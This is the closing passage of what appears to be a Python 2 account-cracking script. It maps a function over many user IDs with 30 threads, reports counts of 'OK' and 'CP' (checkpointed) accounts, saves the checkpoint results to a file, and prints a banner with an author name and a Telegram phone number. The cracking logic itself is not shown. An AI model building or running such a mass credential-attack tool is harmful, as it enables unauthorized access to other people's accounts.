		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 44*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	print """
\033[1;91m
     ██╗███████╗███████╗███╗   ███╗██╗███╗   ██╗
     ██║██╔════╝██╔════╝████╗ ████║██║████╗  ██║
     ██║█████╗  ███████╗██╔████╔██║██║██╔██╗ ██║
██   ██║██╔══╝  ╚════██║██║╚██╔╝██║██║██║╚██╗██║
╚█████╔╝███████╗███████║██║ ╚═╝ ██║██║██║ ╚████║
 ╚════╝ ╚══════╝╚══════╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝
                                                
   
 \033[1;96mDon't Worry Your CheckPoint ID Will Be Open After 24Hours

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....Alex Shohan..... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Telegrame Number
              \033[1;91m +8801406876761"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	login()	
          
if __name__ == '__main__':
	login()
